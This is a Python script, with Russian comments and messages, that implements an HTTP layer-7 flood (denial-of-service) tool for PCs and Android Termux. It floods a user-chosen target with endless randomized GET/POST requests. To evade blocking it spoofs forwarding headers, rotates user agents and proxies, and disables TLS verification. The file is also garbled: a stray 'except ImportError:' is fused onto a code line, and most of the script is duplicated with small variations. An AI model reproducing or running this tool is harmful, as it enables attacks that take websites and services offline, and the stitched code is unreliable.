import subprocess
import sys
import asyncio
import random
import itertools
import platform
import os
import time
import json
import ssl

def install_dependencies():
    required = {
        'aiohttp': 'aiohttp',
        'aiohttp_socks': 'aiohttp-socks', 
        'fake_useragent': 'fake-useragent'
    }
    
    for package, pip_name in required.items():
        try:
            __import__(package)
            print(f"[+] {package} уже установлен")
        except ImportError:
            print(f"[!] Установка {package}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
            except Exception as e:
                print(f"[!] Ошибка установки {package}: {e}")
                if "termux" in sys.prefix.lower():
                    print("[i] В Termux попробуйте: pkg install python && pip install {}".format(pip_name))

install_dependencies()

# Импортируем модули после установки
try:
    import aiohttp
    from fake_useragent import UserAgent
    try:
        from aiohttp_socks import ProxyConnector
    except ImportError:
        ProxyConnector = None
        print("[!] aiohttp_socks не установлен, прокси недоступны")
except ImportError as e:
    print(f"[!] Критическая ошибка импорта: {e}")
    print("[!] Попробуйте переустановить зависимости вручную:")
    print("pip install aiohttp aiohttp-socks fake-useragent")
    sys.exit(1)

def detect_platform():
    system = platform.system().lower()
    if "termux" in sys.prefix.lower() or "android" in system:
        return "termux"
    return system

def optimize_for_platform(platform_type):
    if platform_type == "termux":
        print("[i] Обнаружен Termux, оптимизация для мобильного устройства")
        return {
            'max_threads': 50,
            'timeout': 5,
            'use_proxies': False
        }
    else:
        return {
            'max_threads': 500,
            'timeout': 3,
            'use_proxies': True
        }

async def advanced_flood(target, threads_count, proxy_list=None, platform_config=None):
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
        
    ua = UserAgent()
    request_count = 0
    endpoints = ['', 'wp-admin', 'api/v1', 'login', 'static/img', 'data.json', 'user/profile', 'admin/login', 'api/json', 'graphql']
    
    # Генератор случайных данных для POST-запросов
    def generate_random_data():
        data_types = [
            lambda: json.dumps({'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=random.randint(50, 500)))}),
            lambda: ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=random.randint(100, 1000))),
            lambda: '&'.join([f'{random.choice("abcdefghijkl")}={random.randint(1000,9999)}' for _ in range(random.randint(5, 15))])
        ]
        return random.choice(data_types)()
    
    if proxy_list and ProxyConnector:
        proxy_cycle = itertools.cycle(proxy_list)
    else:
        proxy_cycle = itertools.repeat(None)
        if proxy_list and not ProxyConnector:
            print("[!] aiohttp_socks не установлен, работа без прокси")
        
    async def make_request(session):
        nonlocal request_count
        try:
            endpoint = random.choice(endpoints)
            url = f"{target}/{endpoint}?rnd={random.randint(1000,9999)}&cache={random.randint(100000,999999)}"
            
            # Случайный выбор метода (GET или POST)
            method = random.choice([session.get, session.post])
            
            # Случайные заголовки для обхода блокировок
            headers = {
                'User-Agent': ua.random,
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': random.choice(['ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US,en;q=0.9', 'de-DE,de;q=0.9']),
                'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate']),
                'Connection': random.choice(['keep-alive', 'close']),
                'Cache-Control': random.choice(['no-cache', 'max-age=0', '']),
                'Referer': random.choice([f'http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}', 
                                         'https://www.google.com/', 'https://www.bing.com/', 'https://yandex.ru/'])
            }
            
            # Случайные данные для POST-запросов
            data = generate_random_data() if method == session.post else None
            
            timeout = aiohttp.ClientTimeout(total=platform_config['timeout'])
            
            # Создаем собственный SSL-контекст для обхода проверок
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            if method == session.get:
                async with method(url, headers=headers, timeout=timeout, ssl=ssl_context) as resp:
                    pass
            else:
                # Для POST-запросов добавляем случайный Content-Type
                post_headers = headers.copy()
                post_headers['Content-Type'] = random.choice([
                    'application/json',
                    'application/x-www-form-urlencoded',
                    'text/plain',
                    'multipart/form-data'
                ])
                async with method(url, headers=post_headers, data=data, timeout=timeout, ssl=ssl_context) as resp:
                    pass
                    
            request_count += 1
        except Exception as e:
            pass

    print(f"[+] Запуск улучшенного L7-флуда с {threads_count} потоками")
    print("[+] Платформа: {}".format(detect_platform()))
    print("[+] Методы: GET/POST со случайными данными")
    print("[+] CTRL+C для остановки")

    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, limit=0)) as session:
            tasks = []
            while True:
                task = asyncio.create_task(make_request(session))
                tasks.append(task)
                
                if len(tasks) >= threads_count * 5:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks.clear()
                
                if request_count % 10 == 0:
                    print(f"\r[+] Отправлено запросов: {request_count} | Активных задач: {len(tasks)}", end='')
                
                await asyncio.sleep(0.01)
                
    except KeyboardInterrupt:
        print(f"\n[!] Атака остановлена. Всего отправлено: {request_count} запросов")
    except Exception as e:
        print(f"\n[!] Критическая ошибка: {e}")

if __name__ == "__main__":
    print("[+] Кроссплатформенный L7-флуд v2.1")
    print("[+] Адаптация для PC/Termux/Android")
    print("[+] Улучшенный обход блокировок")
    
    current_platform = detect_platform()
    platform_config = optimize_for_platform(current_platform)
    
    target = input("[?] Введите цель (URL или IP): ").strip()
    
    try:
        default_threads = platform_config['max_threads']
        threads_input = input(f"[?] Количество потоков ({default_threads}): ").strip()
        threads = int(threads_input) if threads_input else default_threads
        threads = min(threads, platform_config['max_threads'])
    except:
        threads = platform_config['max_threads']
    
    proxy_list = []
    if platform_config['use_proxies']:
        use_proxies = input("[?] Использовать прокси? (y/N): ").lower().strip()
        if use_proxies == 'y':
            proxy_file = input("[?] Путь к файлу с проксями: ").strip()
            try:
                with open(proxy_file, 'r') as f:
                    proxy_list = [line.strip() for line in f.readlines() if line.strip()]
                print(f"[+] Загружено {len(proxy_list)} прокси")
            except:
                print("[!] Файл не найден, работа без прокси")
    else:
        print("[i] На мобильных устройствах прокси отключены для стабильности")
    
    print("[+] Запуск через 3 секунды...")
    time.sleep(3)
    
    # Проверяем, что aiohttp импортирован корректно
    if 'aiohttp' not in globals():
        print("[!] Критическая ошибка: aiohttp не импортирован")
        sys.exit(1)
    
    asyncio.run(advanced_flood(target, threads, proxy_list, platform_config))except ImportError:
    ProxyConnector = None

def detect_platform():
    system = platform.system().lower()
    if "termux" in sys.prefix.lower() or "android" in system:
        return "termux"
    return system

def optimize_for_platform(platform_type):
    if platform_type == "termux":
        print("[i] Обнаружен Termux, оптимизация для мобильного устройства")
        return {
            'max_threads': 50,
            'timeout': 5,
            'use_proxies': False
        }
    else:
        return {
            'max_threads': 500,
            'timeout': 3,
            'use_proxies': True
        }

async def advanced_flood(target, threads_count, proxy_list=None, platform_config=None):
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
        
    ua = UserAgent()
    request_count = 0
    endpoints = ['', 'wp-admin', 'api/v1', 'login', 'static/img', 'data.json', 'user/profile', 'admin/login', 'api/json', 'graphql']
    
    # Генератор случайных данных для POST-запросов
    def generate_random_data():
        data_types = [
            lambda: json.dumps({'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=random.randint(50, 500)))}),
            lambda: ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=random.randint(100, 1000))),
            lambda: '&'.join([f'{random.choice("abcdefghijkl")}={random.randint(1000,9999)}' for _ in range(random.randint(5, 15))])
        ]
        return random.choice(data_types)()
    
    if proxy_list and ProxyConnector:
        proxy_cycle = itertools.cycle(proxy_list)
    else:
        proxy_cycle = itertools.repeat(None)
        if proxy_list and not ProxyConnector:
            print("[!] aiohttp_socks не установлен, работа без прокси")
        
    async def make_request(session):
        nonlocal request_count
        try:
            endpoint = random.choice(endpoints)
            url = f"{target}/{endpoint}?rnd={random.randint(1000,9999)}&cache={random.randint(100000,999999)}"
            
            # Случайный выбор метода (GET или POST)
            method = random.choice([session.get, session.post])
            
            # Случайные заголовки для обхода блокировок
            headers = {
                'User-Agent': ua.random,
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': random.choice(['ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US,en;q=0.9', 'de-DE,de;q=0.9']),
                'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate']),
                'Connection': random.choice(['keep-alive', 'close']),
                'Cache-Control': random.choice(['no-cache', 'max-age=0', '']),
                'Referer': random.choice([f'http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}', 
                                         'https://www.google.com/', 'https://www.bing.com/', 'https://yandex.ru/'])
            }
            
            # Случайные данные для POST-запросов
            data = generate_random_data() if method == session.post else None
            
            timeout = aiohttp.ClientTimeout(total=platform_config['timeout'])
            
            # Создаем собственный SSL-контекст для обхода проверок
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            if method == session.get:
                async with method(url, headers=headers, timeout=timeout, ssl=ssl_context) as resp:
                    pass
            else:
                # Для POST-запросов добавляем случайный Content-Type
                post_headers = headers.copy()
                post_headers['Content-Type'] = random.choice([
                    'application/json',
                    'application/x-www-form-urlencoded',
                    'text/plain',
                    'multipart/form-data'
                ])
                async with method(url, headers=post_headers, data=data, timeout=timeout, ssl=ssl_context) as resp:
                    pass
                    
            request_count += 1
        except Exception as e:
            pass

    print(f"[+] Запуск улучшенного L7-флуда с {threads_count} потоками")
    print("[+] Платформа: {}".format(detect_platform()))
    print("[+] Методы: GET/POST со случайными данными")
    print("[+] CTRL+C для остановки")

    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, limit=0)) as session:
            tasks = []
            while True:
                task = asyncio.create_task(make_request(session))
                tasks.append(task)
                
                if len(tasks) >= threads_count * 5:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks.clear()
                
                if request_count % 10 == 0:
                    print(f"\r[+] Отправлено запросов: {request_count} | Активных задач: {len(tasks)}", end='')
                
                await asyncio.sleep(0.01)
                
    except KeyboardInterrupt:
        print(f"\n[!] Атака остановлена. Всего отправлено: {request_count} запросов")
    except Exception as e:
        print(f"\n[!] Критическая ошибка: {e}")

if __name__ == "__main__":
    print("[+] Кроссплатформенный L7-флуд v2.1")
    print("[+] Адаптация для PC/Termux/Android")
    print("[+] Улучшенный обход блокировок")
    
    current_platform = detect_platform()
    platform_config = optimize_for_platform(current_platform)
    
    target = input("[?] Введите цель (URL или IP): ").strip()
    
    try:
        default_threads = platform_config['max_threads']
        threads_input = input(f"[?] Количество потоков ({default_threads}): ").strip()
        threads = int(threads_input) if threads_input else default_threads
        threads = min(threads, platform_config['max_threads'])
    except:
        threads = platform_config['max_threads']
    
    proxy_list = []
    if platform_config['use_proxies']:
        use_proxies = input("[?] Использовать прокси? (y/N): ").lower().strip()
        if use_proxies == 'y':
            proxy_file = input("[?] Путь к файлу с проксями: ").strip()
            try:
                with open(proxy_file, 'r') as f:
                    proxy_list = [line.strip() for line in f.readlines() if line.strip()]
                print(f"[+] Загружено {len(proxy_list)} прокси")
            except:
                print("[!] Файл не найден, работа без прокси")
    else:
        print("[i] На мобильных устройствах прокси отключены для стабильности")
    
    print("[+] Запуск через 3 секунды...")
    
    try:
        if current_platform == "termux":
            import uvloop
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
            print("[i] UVLoop активирован для Termux")
    except:
        pass
    
    time.sleep(3)
    
    asyncio.run(advanced_flood(target, threads, proxy_list, platform_config))
